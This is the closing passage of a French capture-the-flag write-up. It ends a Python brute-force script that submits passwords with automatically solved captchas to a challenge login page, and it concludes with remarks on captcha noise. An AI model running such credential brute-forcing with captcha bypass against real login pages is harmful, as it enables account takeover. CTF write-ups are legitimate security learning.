</span></span><span class="line"><span class="cl">        <span class="n">req</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s2">&#34;http://passichronophage.chall.malicecyber.com/login.php&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;username&#39;</span><span class="p">:</span><span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">username</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">)),</span> <span class="s1">&#39;password&#39;</span><span class="p">:</span><span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">password</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">)),</span> <span class="s1">&#39;captcha&#39;</span><span class="p">:</span><span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">ret</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">))})</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="s2">&#34;Wrong captcha&#34;</span> <span class="ow">in</span> <span class="n">req</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Wrong Captcha: </span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="s2">&#34;Bad username/password&#34;</span> <span class="ow">in</span> <span class="n">req</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Bad password: </span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Password: </span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">exit</span><span class="p">()</span>
</span></span></code></pre></div><h2 id="conclusion">Conclusion</h2>
<p>Etant donné que les captchas étaient générés aléatoirement il n&rsquo;était pas possible d&rsquo;éliminer correctement le bruit à chaque fois et donc d&rsquo;obtenir un taux de réussite de 100% quand à la détermination des captchas.
C&rsquo;est pourquoi il était plus judicieux de s&rsquo;assurer que le captcha était bien validé avant de voir si le mot de passe essayé était à bon ou non, dans le cas contraire si le bon mot de passe était essayé mais que le captcha n&rsquo;était pas le bon, tout le reste du bruteforce était à jeter (logique hein). Je n&rsquo;ait pas utilisé cette technique je m&rsquo;estime donc chanceux que le captcha soit juste lorsque le mot de passe correct a été essayé! ;)</p>
<p><img src="./assets/Capture_x.PNG" alt=""></p>
</div>
  
    <div class="mt-16">

</div>
  
</article>
      </div>
    </main><footer class="fixed left-0 bottom-0 w-full bg-base px-page-gutter">
  <div class="flex justify-center items-center h-footer-height">
    <div
      class="flex flex-row w-full max-w-content justify-between lowercase italic gap-3"
    >
      <nav>
        <ul class="flex text-md space-x-3 sm:space-x-6">
          
        </ul>
      </nav>
      <span class="text-muted hidden md:block">
        &copy;
        2024
        <a
          href="https://github.com/ntk148v/hugo-toigian"
          class="font-bold hover:underline"
          >hugo-toigian</a
        >
      </span>
      <div id="header-theme-button">
        <svg
          id="dark_mode_btn"
          class="hidden toolbox-btn"
          width="18px"
          height="18px"
          xmlns="http://www.w3.org/2000/svg"
          fill="none"
          viewBox="0 0 24 24"
          stroke-width="1.5"
          stroke="currentColor"
        >
          <path
            stroke-linecap="round"
            stroke-linejoin="round"
            d="M21.752 15.002A9.718 9.718 0 0118 15.75c-5.385 0-9.75-4.365-9.75-9.75 0-1.33.266-2.597.748-3.752A9.753 9.753 0 003 11.25C3 16.635 7.365 21 12.75 21a9.753 9.753 0 009.002-5.998z"
          />
        </svg>
        <svg
          id="light_mode_btn"
          class="hidden toolbox-btn"
          width="18px"
          height="18px"
          xmlns="http://www.w3.org/2000/svg"
          fill="none"
          viewBox="0 0 24 24"
          stroke-width="1.5"
          stroke="currentColor"
        >
          <path
            stroke-linecap="round"
            stroke-linejoin="round"
            d="M12 3v2.25m6.364.386l-1.591 1.591M21 12h-2.25m-.386 6.364l-1.591-1.591M12 18.75V21m-4.773-4.227l-1.591 1.591M5.25 12H3m4.227-4.773L5.636 5.636M15.75 12a3.75 3.75 0 11-7.5 0 3.75 3.75 0 017.5 0z"
          />
        </svg>
      </div>
    </div>
  </div>
</footer>
</body>
</html>
